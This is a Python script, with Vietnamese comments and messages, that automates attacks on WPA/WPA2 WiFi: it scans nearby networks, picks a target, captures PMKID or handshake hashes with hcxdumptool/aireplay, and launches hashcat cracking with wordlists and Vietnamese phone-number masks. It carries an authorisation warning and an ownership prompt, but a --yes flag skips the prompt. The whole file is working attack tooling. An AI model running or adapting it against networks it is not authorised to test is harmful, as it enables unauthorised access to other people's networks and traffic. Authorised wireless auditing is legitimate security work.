#!/usr/bin/env python3
"""Quét WiFi xung quanh, chọn mục tiêu, capture PMKID/handshake rồi crack tự động.

Chỉ dùng cho mạng bạn sở hữu hoặc có uỷ quyền bằng văn bản.

Chạy: sudo python3 audit.py
"""

import argparse
import os
import shutil
import subprocess
import sys
from pathlib import Path

import ui

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)

ROOT = Path(__file__).resolve().parent
CAPTURES = ROOT / "captures"
SCAN_FIELDS = ("IN-USE", "BSSID", "SSID", "CHAN", "FREQ", "SIGNAL", "SECURITY")
REQUIRED_TOOLS = {
    "nmcli": "networkmanager",
    "iw": "iw",
    "hcxdumptool": "hcxdumptool",
    "hcxpcapngtool": "hcxtools",
    "aircrack-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "hashcat": "hashcat",
}


def split_escaped(line):
    fields, current, escaped = [], [], False
    for ch in line:
        if escaped:
            current.append(ch)
            escaped = False
        elif ch == "\\":
            escaped = True
        elif ch == ":":
            fields.append("".join(current))
            current = []
        else:
            current.append(ch)
    if escaped:
        current.append("\\")
    fields.append("".join(current))
    return fields


def check_tools():
    missing = {}
    for tool, package in REQUIRED_TOOLS.items():
        if not shutil.which(tool):
            missing.setdefault(package, []).append(tool)
    if missing:
        for package, tools in sorted(missing.items()):
            ui.error(f"thiếu {', '.join(tools)} — cài: sudo pacman -S {package}")
        sys.exit(1)


def check_hashcat_backend():
    result = subprocess.run(
        ["hashcat", "-I"],
        capture_output=True,
        text=True,
        errors="replace",
    )
    output = result.stdout + result.stderr
    if result.returncode == 0 and ("Backend Device ID" in output or "CUDA Info:" in output):
        return True
    ui.error(
        "hashcat không thấy backend OpenCL/CUDA — kiểm tra driver GPU.\n"
        "    Chạy `hashcat -I` để xem chi tiết (vd: sudo pacman -S opencl-nvidia)."
    )
    return False


def detect_iface():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    current = None
    for raw in result.stdout.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            current = line.split(maxsplit=1)[1]
        elif line.startswith("Unnamed"):
            current = None
        elif line.startswith("type ") and current:
            if line == "type managed":
                return current
            current = None
    return None


def list_ifaces():
    result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
    interfaces, current = {}, None
    for raw in result.stdout.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            current = line.split(maxsplit=1)[1]
            interfaces[current] = "unknown"
        elif line.startswith("Unnamed"):
            current = None
        elif line.startswith("type ") and current:
            interfaces[current] = line.split()[1]
            current = None
    return interfaces


def restore_iface(iface, protected=()):
    interfaces = list_ifaces()
    monitors = [name for name, kind in interfaces.items() if kind == "monitor"]
    protected = set(protected)
    if iface not in interfaces:
        candidates = [name for name in monitors if name not in protected]
        if len(candidates) == 1:
            only = candidates[0]
            ui.warn(f"không thấy {iface}, đưa {only} về managed mode")
            subprocess.run(["ip", "link", "set", only, "down"], check=False)
            subprocess.run(["iw", "dev", only, "set", "type", "managed"], check=False)
            subprocess.run(["ip", "link", "set", only, "up"], check=False)
        elif candidates:
            ui.warn(f"không thấy {iface}, còn monitor iface: {', '.join(candidates)} — kiểm tra `iw dev`")
        elif monitors:
            ui.warn(f"không thấy {iface}; giữ nguyên monitor iface có sẵn: {', '.join(monitors)}")
        return
    for name in monitors:
        if name == iface or name in protected:
            continue
        subprocess.run(["ip", "link", "set", name, "down"], check=False)
        subprocess.run(["iw", "dev", name, "del"], check=False)
    if interfaces[iface] == "monitor":
        ui.info(f"đưa {iface} về managed mode")
        subprocess.run(["ip", "link", "set", iface, "down"], check=False)
        subprocess.run(["iw", "dev", iface, "set", "type", "managed"], check=False)
    subprocess.run(["ip", "link", "set", iface, "up"], check=False)


def scan():
    cmd = [
        "nmcli", "-t", "-f", ",".join(SCAN_FIELDS),
        "dev", "wifi", "list", "--rescan", "yes",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, errors="replace")
    if result.returncode != 0:
        sys.exit(f"[x] quét WiFi thất bại: {result.stderr.strip() or 'nmcli lỗi'}")
    aps, seen = [], set()
    for line in result.stdout.splitlines():
        fields = split_escaped(line)
        if len(fields) != len(SCAN_FIELDS):
            continue
        in_use, bssid, ssid, chan, freq, signal, security = fields
        mac = bssid.strip().lower()
        if mac.count(":") != 5:
            continue
        if (mac, chan) in seen:
            continue
        seen.add((mac, chan))
        try:
            strength = int(signal.strip())
        except ValueError:
            strength = 0
        try:
            mhz = int(freq.split()[0])
        except (ValueError, IndexError):
            mhz = 0
        if 2400 <= mhz < 2500:
            band = "2.4"
        elif 5000 <= mhz < 5925:
            band = "5"
        elif mhz >= 5925:
            band = "6"
        else:
            band = "?"
        aps.append({
            "in_use": bool(in_use.strip()),
            "bssid": mac,
            "ssid": ssid or "<ẩn>",
            "chan": chan,
            "band": band,
            "signal": strength,
            "security": security.strip() or "OPEN",
        })
    aps.sort(key=lambda ap: (-ap["signal"], ap["ssid"].lower()))
    return aps


def choose(aps):
    ui.scan_table(aps)
    while True:
        try:
            choice = ui.ask("\nChọn STT mục tiêu (r = quét lại, q = thoát): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit("\n[*] huỷ")
        if choice in ("q", "quit"):
            sys.exit("[*] thoát")
        if choice == "r":
            aps = scan()
            if not aps:
                sys.exit("[x] không quét được mạng nào")
            ui.scan_table(aps)
            continue
        if not choice.isdigit() or not 1 <= int(choice) <= len(aps):
            ui.warn("STT không hợp lệ")
            continue
        ap = aps[int(choice) - 1]
        security = ap["security"].upper()
        if "WEP" in security or security in ("", "OPEN"):
            ui.warn("chỉ hỗ trợ WPA/WPA2 — mạng này mở hoặc dùng WEP.")
            continue
        if "802.1X" in security:
            ui.warn("mạng WPA-Enterprise (802.1X) — không crack được bằng mode 22000.")
            continue
        if "WPA3" in security and "WPA2" not in security:
            ui.warn("mạng WPA3-only (SAE) — không crack được bằng mode 22000.")
            continue
        return ap


def snapshot_hashes():
    return {path for path in CAPTURES.glob("*.hc22000") if not path.name.endswith("-target.hc22000")}


def new_hashes(before):
    candidates = [
        path for path in CAPTURES.glob("*.hc22000")
        if path not in before
        and not path.name.endswith("-target.hc22000")
        and path.stat().st_size > 0
    ]
    return sorted(candidates, key=lambda path: path.stat().st_mtime, reverse=True)


def filter_hash(hashfiles, bssid):
    if not hashfiles:
        return None
    target = bssid.replace(":", "").lower()
    kept = []
    for hashfile in hashfiles:
        for line in hashfile.read_text(encoding="utf-8", errors="replace").splitlines():
            parts = line.split("*")
            if len(parts) > 3 and parts[0] == "WPA" and parts[3].lower() == target:
                kept.append(line)
    if not kept:
        return None
    base = hashfiles[0]
    output = base.with_name(f"{base.stem}-target.hc22000")
    output.write_text("\n".join(kept) + "\n", encoding="utf-8", newline="\n")
    return output


def capture(ap, iface, pmkid_minutes, hs_seconds, protected):
    CAPTURES.mkdir(exist_ok=True)
    try:
        os.chmod(CAPTURES, 0o700)
    except OSError:
        pass
    ui.rule(f"mục tiêu: {ap['ssid']} | {ap['bssid']} | kênh {ap['chan']}")
    ui.warn("WiFi của máy sẽ ngắt tạm thời trong lúc capture, tự bật lại sau.")
    before = snapshot_hashes()

    ui.rule("[1/2] capture PMKID + EAPOL bằng hcxdumptool (một phiên)")
    pmkid_chan = ap["chan"]
    suffix = {"2.4": "a", "5": "b", "6": "c"}.get(ap["band"])
    if suffix and pmkid_chan.isdigit():
        pmkid_chan += suffix
    subprocess.run(
        [
            "bash", str(ROOT / "capture" / "pmkid.sh"),
            iface, str(pmkid_minutes), pmkid_chan, ap["bssid"],
        ],
        cwd=ROOT,
        check=False,
    )
    raws = new_hashes(before)
    target = filter_hash(raws, ap["bssid"])
    if target:
        return target, raws

    restore_iface(iface, protected)
    ui.rule("[2/2] chưa có hash đúng mục tiêu — fallback handshake bằng airodump (cần client reconnect)")
    subprocess.run(
        [
            "bash", str(ROOT / "capture" / "handshake.sh"),
            iface, ap["bssid"], ap["chan"], "", str(hs_seconds),
            ap["band"] if ap["band"] in ("2.4", "5", "6") else "",
        ],
        cwd=ROOT,
        check=False,
    )
    raws = new_hashes(before)
    target = filter_hash(raws, ap["bssid"])
    return target, raws


def nm_active():
    if not shutil.which("systemctl"):
        return False
    status = subprocess.run(
        ["systemctl", "is-active", "NetworkManager"],
        capture_output=True,
        text=True,
        errors="replace",
    )
    return status.stdout.strip() == "active"


def restore_network(was_active):
    if not was_active or nm_active():
        return
    ui.info("bật lại NetworkManager")
    subprocess.run(["systemctl", "start", "NetworkManager"], check=False)


def return_ownership():
    if os.geteuid() != 0:
        return
    uid, gid = os.environ.get("SUDO_UID"), os.environ.get("SUDO_GID")
    if not uid or not gid:
        return
    targets = [CAPTURES, ROOT / "cracked.potfile"]
    for target in targets:
        if not target.exists():
            continue
        paths = [target, *target.rglob("*")] if target.is_dir() else [target]
        for path in paths:
            try:
                os.chown(path, int(uid), int(gid))
            except OSError:
                pass


def crack(hashfile, args):
    cmd = [sys.executable, str(ROOT / "crack.py"), str(hashfile)]
    if args.wordlist:
        cmd += ["--wordlist", args.wordlist]
    if args.mask_lens:
        cmd += ["--mask-lens", args.mask_lens]
    if args.phone:
        cmd.append("--phone")
    if args.deep:
        cmd.append("--deep")
    ui.rule(f"crack {hashfile.name}")
    subprocess.run(cmd, cwd=ROOT, check=False)


def main():
    parser = argparse.ArgumentParser(
        description="Quét WiFi, chọn mục tiêu, capture và crack tự động (chỉ mạng của bạn).",
    )
    parser.add_argument("--iface", help="card WiFi (mặc định: tự dò)")
    parser.add_argument("--pmkid-minutes", type=int, default=5, help="thời gian capture PMKID + EAPOL, phút (mặc định: 5)")
    parser.add_argument("--hs-seconds", type=int, default=60, help="thời gian tối đa bắt handshake, giây (mặc định: 60)")
    parser.add_argument("--wordlist", help="wordlist tuỳ chỉnh cho bước crack")
    parser.add_argument("--mask-lens", default="8", help="độ dài mask số cho bước crack (mặc định: 8)")
    parser.add_argument("--phone", action="store_true", help="thêm mask số điện thoại VN")
    parser.add_argument("--deep", action="store_true", help="thêm rockyou+best66 và hybrid (lâu)")
    parser.add_argument("--yes", action="store_true", help="bỏ qua xác nhận quyền sở hữu mạng")
    args = parser.parse_args()

    if os.geteuid() != 0:
        ui.fail("cần quyền root để quét/capture: sudo python3 audit.py")

    if args.pmkid_minutes < 1:
        ui.fail("--pmkid-minutes phải >= 1")
    if args.hs_seconds < 1:
        ui.fail("--hs-seconds phải >= 1")
    for chunk in args.mask_lens.split(","):
        chunk = chunk.strip()
        if not chunk:
            continue
        if not chunk.isdigit() or not 8 <= int(chunk) <= 12:
            ui.fail(f"--mask-lens không hợp lệ: {chunk} (mask số hỗ trợ 8-12)")
    if args.wordlist:
        wordlist = Path(args.wordlist).expanduser().resolve()
        if not wordlist.is_file():
            ui.fail(f"không thấy wordlist: {wordlist}")
        args.wordlist = str(wordlist)

    os.umask(0o077)
    check_tools()
    if not check_hashcat_backend():
        sys.exit(1)

    nm_was_active = nm_active()
    iface = args.iface or detect_iface()
    if not iface:
        ui.fail("không thấy card WiFi managed — kiểm tra `iw dev` hoặc dùng --iface")

    ui.info(f"card WiFi: {iface}")
    ui.warn("chỉ dùng cho mạng bạn sở hữu hoặc có uỷ quyền bằng văn bản.")
    aps = scan()
    if not aps:
        ui.fail("không quét được mạng nào")
    ap = choose(aps)

    if not args.yes:
        try:
            answer = ui.ask(
                f"[?] Xác nhận '{ap['ssid']}' ({ap['bssid']}) thuộc quyền sở hữu/uỷ quyền của bạn [y/N]: "
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            sys.exit("\n[*] huỷ")
        if answer not in ("y", "yes", "có", "co"):
            sys.exit("[*] huỷ")

    protected = {name for name, kind in list_ifaces().items() if kind == "monitor"}
    try:
        hashfile, raws = capture(ap, iface, args.pmkid_minutes, args.hs_seconds, protected)
    finally:
        restore_iface(iface, protected)
        restore_network(nm_was_active)
        return_ownership()

    if not hashfile:
        if raws:
            names = ", ".join(path.name for path in raws)
            ui.warn(f"file {names} không chứa hash của {ap['bssid']} — không crack để tránh đụng mạng khác.")
            for raw in raws:
                ui.info(f"giữ lại để kiểm tra: {raw}")
        else:
            ui.warn("không bắt được PMKID/handshake. Gợi ý: đứng gần AP hơn, thử kênh khác, hoặc chờ client reconnect.")
        return

    try:
        crack(hashfile, args)
    finally:
        return_ownership()


if __name__ == "__main__":
    main()
